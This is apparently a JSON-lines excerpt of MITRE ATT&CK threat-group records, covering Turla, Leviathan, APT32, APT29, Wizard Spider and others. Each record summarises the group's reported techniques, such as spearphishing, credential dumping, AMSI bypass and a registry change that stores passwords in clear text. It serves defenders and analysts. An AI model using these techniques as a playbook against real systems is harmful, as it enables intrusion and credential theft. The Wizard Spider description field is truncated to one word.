IoCs, including the mutex name and named pipe.", "Turla has used multiple backdoors which communicate with a C2 server via email attachments.", "Turla surveys a system upon check-in to discover information in the Windows Registry with the <code>reg query</code> command. Turla has also retrieved PowerShell payloads hidden in Registry keys as well as checking keys associated with null session named pipes .", "Turla has used legitimate web services including Pastebin, Dropbox, and GitHub for C2 communications.", "Turla RPC backdoors can collect files from USB thumb drives.", "Turla surveys a system upon check-in to discover the system time by using the <code>net time</code> command.", "Turla has used <code>net user</code> to enumerate local accounts on the system.", "Turla has used PowerShell to execute commands/scripts, in some cases via a custom executable or code from Empire's PSInject. Turla has also used PowerShell scripts to load and execute malware in memory.", "Turla has used a AMSI bypass, which patches the in-memory amsi.dll, in PowerShell scripts to bypass Windows antimalware products.", "Turla has used Metasploit to perform reflective DLL injection in order to escalate privileges.", "Turla has created web accounts including Dropbox and GitHub for C2 and document exfiltration.", "Turla RPC backdoors can be used to transfer files to/from victim machines on the local network.", "Turla has used VBS scripts throughout its operations.\t", "A Turla JavaScript backdoor has used Google Apps Script as its C2 server.", "Turla RPC backdoors have used cmd.exe to execute commands.", "Turla has infected victims using watering holes."], "is_subtechnique": false}
{"text": " [Leviathan](https://attack.mitre.org/groups/G0065) is a Chinese state-sponsored cyber espionage group that has been attributed to the Ministry of State Security's (MSS) Hainan State Security Department and an affiliated front company.(Citation: CISA AA21-200A APT40 July 2021) Active since at least 2009, [Leviathan](https://attack.mitre.org/groups/G0065) has targeted the following sectors: academia, aerospace/aviation, biomedical, defense industrial base, government, healthcare, manufacturing, maritime, and transportation across the US, Canada, Europe, the Middle East, and Southeast Asia.(Citation: CISA AA21-200A APT40 July 2021)(Citation: Proofpoint Leviathan Oct 2017)(Citation: FireEye Periscope March 2018)", "idx": "https://attack.mitre.org/groups/G0065", "title": "Leviathan", "entity": "Leviathan", "entity_type": "groups", "entity_context": ["Leviathan has sent spearphishing email links attempting to get a user to click.", "Leviathan has used an uploader known as LUNCHMONEY that can exfiltrate files to Dropbox.", "Leviathan has utilized techniques like reflective DLL loading to write a DLL into memory and load a shell that provides backdoor access to the victim.", "Leviathan has used PowerShell for execution.", "Leviathan relies on web shells for an initial foothold as well as persistence into the victim's systems.", "Leviathan has obfuscated code using base64 and gzip compression.", "Leviathan has targeted RDP credentials and used it to move through the victim environment. ", "Leviathan used ssh for internal reconnaissance.", "Leviathan has established domains that impersonate legitimate entities to use for targeting efforts. ", "Leviathan has used steganography to hide stolen data inside other files stored on Github.", "Leviathan has used publicly available tools to dump password hashes, including HOMEFRY.", "Leviathan has used WMI for persistence.", "Leviathan has used protocol tunneling to further conceal C2 communications and infrastructure.", "Leviathan has inserted garbage characters into code, presumably to avoid anti-virus detection.", "Leviathan has staged data remotely prior to exfiltration.", "Leviathan has used stolen code signing certificates to sign malware.", "Leviathan has exfiltrated data over its C2 channel.", "Leviathan has used JavaScript to create a shortcut file in the Startup folder that points to its main backdoor.", "Leviathan has used VBScript.", "Leviathan has sent spearphishing emails with malicious attachments, including .rtf, .doc, and .xls files.", "Leviathan has sent spearphishing emails with links, often using a fraudulent lookalike domain and stolen branding.", "Leviathan has used a DLL known as SeDll to decrypt and execute other JavaScript backdoors.", "Leviathan has collected compromised credentials to use for targeting efforts.", "Leviathan has sent spearphishing attachments attempting to get a user to click.", "Leviathan has used C:\\Windows\\Debug and C:\\Perflogs as staging directories.", "Leviathan has infected victims using watering holes.", "Leviathan has conducted internal spearphishing within the victim's environment for lateral movement.", "Leviathan has used WMI for execution.", "Leviathan has used BITSAdmin to download additional tools.", "Leviathan has used external remote services such as virtual private networks (VPN) to gain initial access.", "Leviathan has compromised email accounts to conduct social engineering attacks.", "Leviathan has obtained valid accounts to gain initial access.", "Leviathan has utilized OLE as a method to insert malicious content inside various phishing documents. ", "Leviathan has used multi-hop proxies to disguise the source of their malicious traffic.", "Leviathan has compromised social media accounts to conduct social engineering attacks.", "Leviathan has downloaded additional scripts and files from adversary-controlled servers.", "Leviathan has received C2 instructions from user profiles created on legitimate websites such as Github and TechNet.", "Leviathan has archived victim's data prior to exfiltration.", "Leviathan has used publicly available tools to dump password hashes, including ProcDump and WCE.", "Leviathan has created new social media accounts for targeting efforts.", "Leviathan has created new email accounts for targeting efforts.", "Leviathan has used regsvr32 for execution.", "Leviathan has exploited multiple Microsoft Office and .NET vulnerabilities for execution, including CVE-2017-0199, CVE-2017-8759, and CVE-2017-11882."], "is_subtechnique": false}
{"text": " [GOLD SOUTHFIELD](https://attack.mitre.org/groups/G0115) is a financially motivated threat group active since at least 2019 that operates the [REvil](https://attack.mitre.org/software/S0496) Ransomware-as-a Service (RaaS). [GOLD SOUTHFIELD](https://attack.mitre.org/groups/G0115) provides backend infrastructure for affiliates recruited on underground forums to perpetrate high value deployments.(Citation: Secureworks REvil September 2019)(Citation: Secureworks GandCrab and REvil September 2019)(Citation: Secureworks GOLD SOUTHFIELD)", "idx": "https://attack.mitre.org/groups/G0115", "title": "GOLD SOUTHFIELD", "entity": "GOLD SOUTHFIELD", "entity_type": "groups", "entity_context": ["GOLD SOUTHFIELD has breached Managed Service Providers (MSP's) to deliver malware to MSP customers.", "GOLD SOUTHFIELD has staged and executed PowerShell scripts on compromised hosts.", "GOLD SOUTHFIELD has used the cloud-based remote management and monitoring tool \"ConnectWise Control\" to deploy REvil.", "GOLD SOUTHFIELD has exploited Oracle WebLogic vulnerabilities for initial compromise.", "GOLD SOUTHFIELD has conducted malicious spam (malspam) campaigns to gain access to victim's machines.", "GOLD SOUTHFIELD has distributed ransomware by backdooring software installers via a strategic web compromise of the site hosting Italian WinRAR.", "GOLD SOUTHFIELD has used publicly-accessible RDP and remote management and monitoring (RMM) servers to gain access to victim machines.\t", "GOLD SOUTHFIELD has used the remote monitoring and management tool ConnectWise to obtain screen captures from victim's machines.", "GOLD SOUTHFIELD has executed base64 encoded PowerShell scripts on compromised hosts."], "is_subtechnique": false}
{"text": " [PLATINUM](https://attack.mitre.org/groups/G0068) is an activity group that has targeted victims since at least 2009. The group has focused on targets associated with governments and related organizations in South and Southeast Asia. (Citation: Microsoft PLATINUM April 2016)", "idx": "https://attack.mitre.org/groups/G0068", "title": "PLATINUM", "entity": "PLATINUM", "entity_type": "groups", "entity_context": ["PLATINUM has used the Intel® Active Management Technology (AMT) Serial-over-LAN (SOL) channel for command and control.", "PLATINUM is capable of using Windows hook interfaces for information gathering such as credential access.", "PLATINUM has sometimes used drive-by attacks against vulnerable browser plugins.", "PLATINUM has leveraged a zero-day vulnerability to escalate privileges.", "PLATINUM has sent spearphishing emails with attachments to victims as its primary initial access vector.", "PLATINUM has attempted to get users to open malicious files by sending spearphishing emails with attachments to victims.", "PLATINUM has used keyloggers that are also capable of dumping credentials.", "PLATINUM has renamed rar.exe to avoid detection.", "PLATINUM has used various methods of process injection including hot patching.", "PLATINUM has transferred files using the Intel® Active Management Technology (AMT) Serial-over-LAN (SOL) channel.", "PLATINUM has used several different keyloggers."], "is_subtechnique": false}
{"text": " [APT32](https://attack.mitre.org/groups/G0050) is a suspected Vietnam-based threat group that has been active since at least 2014. The group has targeted multiple private sector industries as well as foreign governments, dissidents, and journalists with a strong focus on Southeast Asian countries like Vietnam, the Philippines, Laos, and Cambodia. They have extensively used strategic web compromises to compromise victims.(Citation: FireEye APT32 May 2017)(Citation: Volexity OceanLotus Nov 2017)(Citation: ESET OceanLotus)", "idx": "https://attack.mitre.org/groups/G0050", "title": "APT32", "entity": "APT32", "entity_type": "groups", "entity_context": ["APT32 created a Scheduled Task/Job that used regsvr32.exe to execute a COM scriptlet that dynamically downloaded a backdoor and injected it into memory. The group has also used regsvr32 to run their backdoor. ", "APT32 has used malicious links to direct users to web pages designed to harvest credentials.", "APT32 established persistence using Registry Run keys, both to execute PowerShell and VBS scripts as well as to execute their backdoor directly.", "An APT32 backdoor can use HTTP over a non-standard TCP port (e.g 14146) which is specified in the backdoor configuration.", "APT32 has used PubPrn.vbs within execution scripts to execute malware, possibly bypassing defenses.", "APT32 has obtained and used tools such as Mimikatz and Cobalt Strike, and a variety of other open-source tools from GitHub.", "APT32 has moved and renamed pubprn.vbs to a .txt file to avoid detection.", "APT32 enumerated administrative users using the commands <code>net localgroup administrators</code>.", "APT32 has used RTF document that includes an exploit to execute malicious code. (CVE-2017-11882)", "APT32's backdoor has modified the Windows Registry to store the backdoor's configuration. \t\n", "APT32 has sent spearphishing emails containing malicious links.", "APT32 has used cmd.exe for execution. ", "APT32 compromised McAfee ePO to move laterally by distributing malware as a software deployment task.", "APT32 malware has used rundll32.exe to execute an initial infection process.", "APT32 has used scheduled task raw XML with a backdated timestamp of June 2, 2016. The group has also set the creation time of the files dropped by the second stage of the exploit to match the creation time of kernel32.dll. Additionally, APT32 has used a random value to modify the timestamp of the file storing the clientID.", "APT32 has conducted targeted surveillance against activists and bloggers.", "APT32 has collected the OS version and computer name from victims. One of the group's backdoors can also query the Windows Registry to gather system information, and another macOS backdoor performs a fingerprint of the machine on its first connection to the C&C server. APT32 executed shellcode to identify the name of the infected host.", "APT32's backdoor possesses the capability to list files and directories on a machine. \t\n", "APT32 uses the Invoke-Obfuscation framework to obfuscate their PowerShell and also performs other code obfuscation. APT32 has also encoded payloads using Base64 and a framework called \"Dont-Kill-My-Cat (DKMC). APT32 also encrypts the library used for network exfiltration with AES-256 in CBC mode in their macOS backdoor.", "APT32 has lured targets to download a Cobalt Strike beacon by including a malicious link within spearphishing emails.", "APT32 has used COM scriptlets to download Cobalt Strike beacons.\t", "APT32 has added JavaScript to victim websites to download additional frameworks that profile and compromise website visitors.", "APT32 used NTFS alternate data streams to hide their payloads.", "APT32 has used Dropbox, Amazon S3, and Google Drive to host malicious downloads.", "APT32 has used Web shells to maintain access to victim websites.", "APT32's backdoor can query the Windows Registry to gather system information. ", "APT32 has used the WindowStyle parameter to conceal PowerShell windows.  ", "APT32 used the <code>netstat -anpo tcp</code> command to display TCP connections on the victim's machine.", "APT32's macOS backdoor hides the clientID file via a chflags function.", "APT32 has sent spearphishing emails with a malicious executable disguised as a document or spreadsheet.", "APT32's macOS backdoor changes the permission of the file it wants to execute to 755.", "APT32 used the <code>net view</code> command to show all shares available, including the administrative shares such as <code>C$</code> and <code>ADMIN$</code>.", "APT32 used the <code>ipconfig /all</code> command to gather the IP address from the system.", "APT32 has infected victims by tricking them into visiting compromised watering hole websites.", "APT32 have replaced Microsoft Outlook's VbaProject.OTM file to install a backdoor macro for persistence.", "APT32 successfully gained remote access by using pass the ticket.", "APT32 has set up Dropbox, Amazon S3, and Google Drive to host malicious downloads.", "APT32 has collected e-mail addresses for activists and bloggers in order to target them with spyware.", "APT32 has used PowerShell-based tools, PowerShell one-liners, and shellcode loaders for execution.", "APT32 used Net to use Windows' hidden network shares to copy their tools to remote machines for execution.", "APT32's backdoor can exfiltrate data by encoding it in the subdomain field of DNS packets.", "APT32 has stood up websites containing numerous articles and content scraped from the Internet to make them appear legitimate, but some of these pages include malicious JavaScript to profile the potential victim or infect them via a fake software update.", "APT32 has disguised a Cobalt Strike beacon as a Flash Installer.", "APT32 includes garbage code to mislead anti-malware software and researchers.", "APT32 used GetPassword_x64 to harvest credentials.", "APT32 performed network scanning on the network to search for open ports, services, OS finger-printing, and other vulnerabilities.", "APT32 has used JavaScript that communicates over HTTP or HTTPS to attacker controlled domains to download additional frameworks. The group has also used downloaded encrypted payloads over HTTP.", "APT32 has used mshta.exe for code execution.", "APT32 used Mimikatz and customized versions of Windows Credential Dumper to harvest credentials.", "APT32 has hosted malicious payloads in Dropbox, Amazon S3, and Google Drive for use during targeting.", "APT32 has used hidden or non-printing characters to help masquerade service names, such as appending a Unicode no-break space character to a legitimate service name. APT32 has also impersonated the legitimate Flash installer file name \"install_flashplayer.exe\".", "APT32 collected the victim's username and executed the <code>whoami</code> command on the victim's machine. APT32 executed shellcode to collect the username on the victim's machine. ", "APT32's backdoor has used Windows services as a way to execute its malicious payload. ", "APT32 has used macros, COM scriptlets, and VBS scripts. ", "APT32 used WMI to deploy their tools on remote machines and to gather information about the Outlook process.", "APT32 malware has injected a Cobalt Strike beacon into Rundll32.exe.", "APT32 has used email for C2 via an Office macro.", "APT32 has cleared select event log entries.", "APT32 has used scheduled tasks to persist on victim systems.", "APT32 has used pass the hash for lateral movement.", "APT32 has enumerated DC servers using the command <code>net group \"Domain Controllers\" /domain</code>. The group has also used the <code>ping</code> command.", "APT32's macOS backdoor can receive a “delete” command.", "APT32 has renamed a NetCat binary to kb-10233.exe to masquerade as a Windows update. APT32 has also renamed a Cobalt Strike beacon payload to install_flashplayers.exe. ", "APT32 has set up Facebook pages in tandem with fake websites.", "APT32 has used legitimate local admin account credentials.", "APT32 has set up and operated websites to gather information and deliver malware.", "APT32 modified Windows Services to ensure PowerShell scripts were loaded on the system. APT32 also creates a Windows service to establish persistence.", "APT32 has used JavaScript for drive-by downloads and C2 communications.", "APT32 ran legitimately-signed executables from Symantec and McAfee which load a malicious DLL. The group also side-loads its backdoor by dropping a library and a legitimate, signed executable (AcroTranscoder).", "APT32's backdoor has exfiltrated data using the already opened channel with its C&C server.", "APT32 has deployed tools after moving laterally using administrative accounts.\t", "APT32 has attempted to lure users to execute a malicious dropper delivered via a spearphishing attachment.", "APT32 has abused the PasswordChangeNotify to monitor for and capture account password changes.", "APT32 has used CVE-2016-7255 to escalate privileges.", "APT32 used Outlook Credential Dumper to harvest credentials stored in Windows registry.", "APT32's backdoor has used LZMA compression and RC4 encryption before exfiltration."], "is_subtechnique": false}
{"text": " [Whitefly](https://attack.mitre.org/groups/G0107) is a cyber espionage group that has been operating since at least 2017. The group has targeted organizations based mostly in Singapore across a wide variety of sectors, and is primarily interested in stealing large amounts of sensitive information. The group has been linked to an attack against Singapore’s largest public health organization, SingHealth.(Citation: Symantec Whitefly March 2019)", "idx": "https://attack.mitre.org/groups/G0107", "title": "Whitefly", "entity": "Whitefly", "entity_type": "groups", "entity_context": ["Whitefly has used search order hijacking to run the loader Vcrodat.\t", "Whitefly has named the malicious DLL the same name as DLLs belonging to legitimate software from various security vendors.", "Whitefly has the ability to download additional tools from the C2.", "Whitefly has obtained and used tools such as Mimikatz.", "Whitefly has encrypted the payload used for C2.\t", "Whitefly has used an open-source tool to exploit a known Windows privilege escalation vulnerability (CVE-2016-0051) on unpatched computers.\t", "Whitefly has used Mimikatz to obtain credentials.", "Whitefly has used a simple remote shell tool that will call back to the C2 server and wait for commands.", "Whitefly has used malicious .exe or .dll files disguised as documents or images."], "is_subtechnique": false}
{"text": " [Moafee](https://attack.mitre.org/groups/G0002) is a threat group that appears to operate from the Guandong Province of China. Due to overlapping TTPs, including similar custom tools, Moafee is thought to have a direct or indirect relationship with the threat group [DragonOK](https://attack.mitre.org/groups/G0017). (Citation: Haq 2014)", "idx": "https://attack.mitre.org/groups/G0002", "title": "Moafee", "entity": "Moafee", "entity_type": "groups", "entity_context": ["Moafee has been known to employ binary padding."], "is_subtechnique": false}
{"text": " [Darkhotel](https://attack.mitre.org/groups/G0012) is a suspected South Korean threat group that has targeted victims primarily in East Asia since at least 2004. The group's name is based on cyber espionage operations conducted via hotel Internet networks against traveling executives and other select guests. [Darkhotel](https://attack.mitre.org/groups/G0012) has also conducted spearphishing campaigns and infected victims through peer-to-peer and file sharing networks.(Citation: Kaspersky Darkhotel)(Citation: Securelist Darkhotel Aug 2015)(Citation: Microsoft Digital Defense FY20 Sept 2020)", "idx": "https://attack.mitre.org/groups/G0012", "title": "Darkhotel", "entity": "Darkhotel", "entity_type": "groups", "entity_context": ["Darkhotel used a virus that propagates by infecting executables stored on shared drives.", "Darkhotel malware has used a series of checks to determine if it's being analyzed; checks include the length of executable names, if a filename ends with <code>.Md5.exe</code>, and if the program is executed from the root of the C:\\ drive, as well as checks for sandbox-related libraries.", "Darkhotel has used malware that is disguised as a Secure Shell (SSH) tool.", "Darkhotel has used malware that searched for files with specific patterns.", "Darkhotel's selective infector modifies executables stored on removable media as a method of spreading across computers.", "Darkhotel has used AES-256 and 3DES for C2 communications.", "Darkhotel has sent spearphishing emails in an attempt to lure users into clicking on a malicious attachments.", "Darkhotel malware has employed just-in-time decryption of strings to evade sandbox detection.", "Darkhotel has collected the hostname, OS version, service pack version, and the processor architecture from the victim’s machine.", "Darkhotel has been known to establish persistence by adding programs to the Run Registry key.", "Darkhotel has used a keylogger.", "Darkhotel has sent spearphishing emails with malicious RAR and .LNK attachments.", "Darkhotel has exploited Adobe Flash vulnerability CVE-2015-8651 for execution.", "Darkhotel malware can obtain system time from a compromised host.", "Darkhotel malware can collect a list of running processes on a system.", "Darkhotel has used malware that repeatedly checks the mouse cursor position to determine if a real user is on the system.", "Darkhotel has searched for anti-malware strings and anti-virus processes running on the system. ", "Darkhotel has used code-signing certificates on its malware that are either forged due to weak keys or stolen. Darkhotel has also stolen certificates and signed backdoors and downloaders with them.", "Darkhotel has decrypted strings and imports using RC4 during execution.", "Darkhotel has collected the IP address and network adapter information from the victim’s machine.", "Darkhotel has obfuscated code using RC4, XOR, and RSA.", "Darkhotel used embedded iframes on hotel login portals to redirect selected victims to download malware.", "Darkhotel has dropped an mspaint.lnk shortcut to disk which launches a shell script that downloads and executes a file.", "Darkhotel has used first-stage payloads that download additional malware from C2 servers."], "is_subtechnique": false}
{"text": " [APT29](https://attack.mitre.org/groups/G0016) is threat group that has been attributed to Russia's Foreign Intelligence Service (SVR).(Citation: White House Imposing Costs RU Gov April 2021)(Citation: UK Gov Malign RIS Activity April 2021) They have operated since at least 2008, often targeting government networks in Europe and NATO member countries, research institutes, and think tanks. [APT29](https://attack.mitre.org/groups/G0016) reportedly compromised the Democratic National Committee starting in the summer of 2015.(Citation: F-Secure The Dukes)(Citation: GRIZZLY STEPPE JAR)(Citation: Crowdstrike DNC June 2016)(Citation: UK Gov UK Exposes Russia SolarWinds April 2021) In April 2021, the US and UK governments attributed the SolarWinds supply chain compromise cyber operation to the SVR; public statements included citations to [APT29](https://attack.mitre.org/groups/G0016), Cozy Bear, and The Dukes.(Citation: NSA Joint Advisory SVR SolarWinds April 2021)(Citation: UK NSCS Russia SolarWinds April 2021) Victims of this campaign included government, consulting, technology, telecom, and other organizations in North America, Europe, Asia, and the Middle East. Industry reporting referred to the actors involved in this campaign as UNC2452, NOBELIUM, StellarParticle, and Dark Halo.(Citation: FireEye SUNBURST Backdoor December 2020)(Citation: MSTIC NOBELIUM Mar 2021)(Citation: CrowdStrike SUNSPOT Implant January 2021)(Citation: Volexity SolarWinds)(Citation: Cybersecurity Advisory SVR TTP May 2021)", "idx": "https://attack.mitre.org/groups/G0016", "title": "APT29", "entity": "APT29", "entity_type": "groups", "entity_context": ["APT29 has used WinRM via PowerShell to execute command and payloads on remote hosts.", "APT29 modified timestamps of backdoors to match legitimate Windows files.", "APT29 obtained PKI keys, certificate files and the private encryption key from an Active Directory Federation Services (AD FS) container to decrypt corresponding SAML signing certificates.", "APT29 has used WMI event subscriptions for persistence.", "APT29 used the service control manager on a remote system to disable services associated with security monitoring products.", "APT29 drops a Windows shortcut file for execution.", "APT29 collected emails from specific individuals, such as executives and IT staff, using <code>New-MailboxExportRequest</code> followed by <code>Get-MailboxExportRequest</code>.", "APT29 added their own devices as allowed IDs for active sync using <code>Set-CASMailbox</code>, allowing it to obtain copies of victim mailboxes. It also added additional permissions (such as Mail.Read and Mail.ReadWrite) to compromised Application or Service Principals.", "APT29 has used spearphishing with a link to trick victims into clicking on a link to a zip file containing malicious files.", "APT29 has used TCP for C2 communications.", "APT29 gained initial network access to some victims via a trojanized update of SolarWinds Orion software.", "APT29 has written malware variants in Visual Basic.", "APT29 has used multiple software exploits for common client software, like Microsoft Word, Exchange, and Adobe Reader, to gain code execution.", "APT29 used the <code>Get-AcceptedDomain</code> PowerShell cmdlet to enumerate accepted domains through an Exchange Management Shell. They also used AdFind to enumerate domains and to discover trust between federated domains.", "APT29 leveraged privileged accounts to replicate directory service data with domain controllers.", "APT29 routinely removed their tools, including custom backdoors, once remote access was achieved. APT29 has also used SDelete to remove artifacts from victims.", "APT29 has used compromised identities to access VPNs and remote access tools.", "APT29 used <code>netsh</code> to configure firewall rules that limited certain UDP outbound packets.", "APT29 added Registry Run keys to establish persistence.", "APT29 has used spearphishing emails with an attachment to deliver files with exploits to initial victims.", "APT29 used Kerberos ticket attacks for lateral movement.", "APT29 used the <code>Get-ManagementRoleAssignment</code> PowerShell cmdlet to enumerate Exchange management role assignments through an Exchange Management Shell.", "APT29 renamed software and DLL's with legitimate names to appear benign.", "APT29 has exfiltrated collected data over a simple HTTPS request to a password-protected archive staged on a victim's OWA servers.", "APT29 used <code>AUDITPOL</code> to prevent the collection of audit logs.", "APT29 has used <code>Rundll32.exe</code> to execute payloads.", "APT29 has set the hostnames of its C2 infrastructure to match legitimate hostnames in the victim environment. They have also used IP addresses originating from the same country as the victim for their VPN infrastructure.", "APT29 has used GoldFinder to perform HTTP GET requests to check internet connectivity and identify HTTP proxy servers and other redirectors that an HTTP request travels through.", "APT29 has downloaded source code from code repositories.", "APT29 was able to get SUNBURST signed by SolarWinds code signing certificates by injecting the malware into the SolarWinds Orion software lifecycle.", "APT29 used UPX to pack files.", "APT29 has used compromised certificates issued by Mimecast to authenticate to Mimecast customer systems.", "APT29 used forged SAML tokens that allowed the actors to impersonate users and bypass MFA, enabling APT29 to access enterprise cloud applications and services.", "APT29 removed evidence of email export requests using <code>Remove-MailboxExportRequest</code>. They temporarily replaced legitimate utilities with their own, executed their payload, and then restored the original file.", "APT29 named tasks <code>\\Microsoft\\Windows\\SoftwareProtectionPlatform\\EventCacheManager</code> in order to appear legitimate.", "APT29 has downloaded additional tools, such as TEARDROP malware and Cobalt Strike, to a compromised host following initial access.", "APT29 obtained Ticket Granting Service (TGS) tickets for Active Directory Service Principle Names to crack offline.", "APT29 has used encoded PowerShell commands.", "APT29 used 7-Zip to compress stolen emails into password-protected archives prior to exfiltration.", "APT29 used sticky-keys to obtain unauthenticated, privileged console access.", "APT29 used dynamic DNS resolution to construct and resolve to randomly-generated subdomains for C2.", "APT29 has used Port Number 443 for C2.", "APT29 has installed web shells on exploited Microsoft Exchange servers.", "APT29 used <code>scheduler</code> and <code>schtasks</code> to create new tasks on remote hosts as part of lateral movement. They have manipulated scheduled tasks by updating an existing legitimate task to execute their tools and then returned the scheduled task to its original configuration. APT29 also created a scheduled task to maintain SUNSPOT persistence when the host booted during the 2020 SolarWinds intrusion. They previously used named and hijacked scheduled tasks to also establish persistence.", "APT29 has used the legitimate mailing service Constant Contact to send phishing e-mails.\n", "APT29 used a forged <code>duo-sid</code> cookie to bypass MFA set on an email account.", "APT29 has registered algorithmically generated Twitter handles that are used for C2 by malware, such as HAMMERTOSS.", "APT29 has compromised domains to use for C2.", "APT29 has used AdFind to enumerate remote systems.", "APT29 has used various forms of spearphishing attempting to get a user to click on a malicous link.", "APT29 has obtained and used a variety of tools including Mimikatz, SDelete, Tor, meek, and Cobalt Strike.", "APT29 has used multiple command-line utilities to enumerate running processes.", "APT29 staged data and files in password-protected archives on a victim's OWA server.", "APT29 used different compromised credentials for remote access and to move laterally.", "APT29 has exploited CVE-2019-19781 for Citrix, CVE-2019-11510 for Pulse Secure VPNs, CVE-2018-13379 for FortiGate VPNs, and CVE-2019-9670 in Zimbra software to gain access. They have also exploited CVE-2020-0688 against the Microsoft Exchange Control Panel to regain access to a network.", "APT29 has used large file sizes to avoid detection.", "APT29 has acquired C2 domains, sometimes through resellers.", "APT29 changed domain federation trust settings using Azure AD administrative permissions to configure the domain to accept authorization tokens signed by their own SAML signing certificate.", "APT29 has used encoded PowerShell scripts uploaded to CozyCar installations to download and install SeaDuke. APT29 also used PowerShell to create new tasks on remote machines, identify configuration settings, evade defenses, exfiltrate data, and to execute other commands.", "APT29 has bypassed MFA set on OWA accounts by generating a cookie value from a previously stolen secret key.", "APT29 has used valid accounts, including administrator accounts, to help facilitate lateral movement on compromised networks.", "APT29 has used steganography to hide C2 communications in images.", "APT29 obtained information about the configured Exchange virtual directory using <code>Get-WebServicesVirtualDirectory</code>.", "APT29 has bypassed UAC.", "APT29 has conducted widespread scanning of target environments to identify vulnerabilities for exploit.", "APT29 has extracted files from compromised networks. ", "APT29 has added credentials to OAuth Applications and Service Principals. ", "APT29 has developed malware variants written in Python.", "APT29 obtained a list of users and their roles from an Exchange server using <code>Get-ManagementRoleAssignment</code>.", "APT29 has used various forms of spearphishing attempting to get a user to open attachments, including, but not limited to, malicious Microsoft Word documents, .pdf, and .lnk files.  ", "APT29 has used HTTP for C2 and data exfiltration.", "APT29 created tokens using compromised SAML signing certificates.", "A backdoor used by APT29 created a Tor hidden service to forward traffic from the Tor client to local ports 3389 (RDP), 139 (Netbios), and 445 (SMB) enabling full remote access from outside the network.", "APT29 has used social media platforms to hide communications to C2 servers.", "APT29 used WMI to steal credentials and execute backdoors at a future time. They have also used WMI for the remote execution of files for lateral movement.", "APT29 used 7-Zip to decode its Raindrop malware.", "APT29 used <code>cmd.exe</code> to execute commands on remote machines.", "APT29 used account credentials they obtained to attempt access to Group Managed Service Account (gMSA) passwords.", "APT29 used <code>fsutil</code> to check available free space before executing actions that might create large files on disk.", "APT29 has leveraged numerous pieces of malware that appear to be unique to APT29 and were likely developed for or by the group.", "APT29 has used the meek domain fronting plugin for Tor to hide the destination of C2 traffic.", "APT29 has conducted brute force password spray attacks.", "APT29 has created self-signed digital certificates to enable mutual TLS authentication for malware.", "APT29 configured at least one instance of Cobalt Strike to use a network pipe over SMB during the 2020 SolarWinds intrusion."], "is_subtechnique": false}
{"text": " Conti", "idx": "https://attack.mitre.org/groups/G0102", "title": "Wizard Spider", "entity": "Wizard Spider", "entity_type": "groups", "entity_context": ["Wizard Spider has acquired credentials from the SAM/SECURITY registry hives.", "Wizard Spider has used Window Remote Management to move laterally through a victim network.", "Wizard Spider has used WMI and LDAP queries for network discovery and to move laterally.", "Wizard Spider has used macros to execute PowerShell scripts to download malware on victim's machines. It has also used PowerShell to execute commands and move laterally through a victim network.", "Wizard Spider used Base64 encoding to obfuscate an Empire service and PowerShell commands.", "Wizard Spider has lured victims to execute malware with spearphishing attachments containing macros to download either Emotet, Bokbot, TrickBot, or Bazar.", "Wizard Spider has installed TrickBot as a service named ControlServiceA in order to establish persistence.", "Wizard Spider has used Digicert code-signing certificates for some of its malware.", "Wizard Spider has used valid credentials for privileged accounts with the goal of accessing domain controllers. ", "Wizard Spider has used Rubeus, MimiKatz Kerberos module, and the Invoke-Kerberoast cmdlet to steal AES hashes.", "Wizard Spider has exfiltrated victim information using FTP.", "Wizard Spider has established persistence using Userinit by adding the Registry key HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon.", "Wizard Spider has used scheduled tasks to install TrickBot, using task names to appear legitimate such as WinDotNet, GoogleTask, or Sysnetsf. It has also used common document file names for other malware binaries.", "Wizard Spider has identified domain admins through the use of “net group ‘Domain admins’” commands.", "Wizard Spider has used stolen credentials to copy tools into the <code>%TEMP%</code> directory of domain controllers.", "Wizard Spider obtained a code signing certificate signed by Digicert for some of its malware.", "Wizard Spider has used \"ipconfig\" to identify the network configuration of a victim machine.", "Wizard Spider has obtained and used publicly-available post-exploitation frameworks and tools like Metasploit, Empire, Mimikatz.", "Wizard Spider has injected malicious DLLs into memory with read, write, and execute permissions.", "Wizard Spider has sent phishing emails containing a link to an actor-controlled Google Drive document or other free online file hosting services.", "Wizard Spider has used taskkill.exe and net.exe to stop backup, catalog, cloud, and other services prior to network encryption.", "Wizard Spider has used networkdll for network discovery and psfin specifically for financial and point of sale indicators. Wizard Spider has also used AdFind and <code>nltest/dclist</code> to enumerate domain computers, including the domain controller.", "Wizard Spider has used administrative accounts, including Domain Admin, to move laterally within a victim network.", "Wizard Spider has lured victims into clicking a malicious link delivered through spearphishing.", "Wizard Spider has used RDP for lateral movement.", "Wizard Spider has used the icacls command to modify access control to backup servers, providing them with full control of all the system folders.", "Wizard Spider has modified the Registry key <code>HKLM\\System\\CurrentControlSet\\Control\\SecurityProviders\\WDigest</code> by setting the <code>UseLogonCredential</code> registry value to <code>1</code> in order to force credentials to be stored in clear text in memory.", "Wizard Spider has used scheduled tasks establish persistence for TrickBot and other malware.", "Wizard Spider has used WMI to identify anti-virus products installed on a victim's machine.", "Wizard Spider has gained access to credentials via exported copies of the ntds.dit Active Directory database.", "Wizard Spider has collected and staged credentials and network enumeration information, using  the networkdll and psfin TrickBot modules.", "Wizard Spider has accessed victim networks by using stolen credentials to access the corporate VPN infrastructure.", "Wizard Spider has used the “net view” command to locate mapped network shares.", "Wizard Spider has used \"whoami\" to identify the local user and their privileges.", "Wizard Spider has used services.exe to execute scripts and executables during lateral movement within a victim network.", "Wizard Spider has used file deletion to remove some modules and configurations from an infected host after use.", "Wizard Spider has established persistence via the Registry key HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run and a shortcut within the startup folder.", "Wizard Spider has exfiltrated domain credentials and network enumeration information over command and control (C2) channels.", "Wizard Spider has used spearphishing attachments to deliver Microsoft documents containing macros or PDFs containing malicious links to download either Emotet, Bokbot, TrickBot, or Bazar.", "Wizard Spider has used HTTP for network communications.", "Wizard Spider has used SMB to drop Cobalt Strike Beacon on a domain controller for lateral movement.", "Wizard Spider has exploited or attempted to exploit Zerologon (CVE-2020-1472) and EternalBlue (MS17-010) vulnerabilities.", "Wizard Spider has used the Invoke-Inveigh PowerShell cmdlets, likely for name service poisoning.", "Wizard Spider has used cmd.exe to execute commands on a victim's machine.", "Wizard Spider has shut down or uninstalled security applications on victim systems that might prevent ransomware from executing.", "Wizard Spider has used “systeminfo” and similar commands to acquire detailed configuration information of a victim machine."], "is_subtechnique": false}
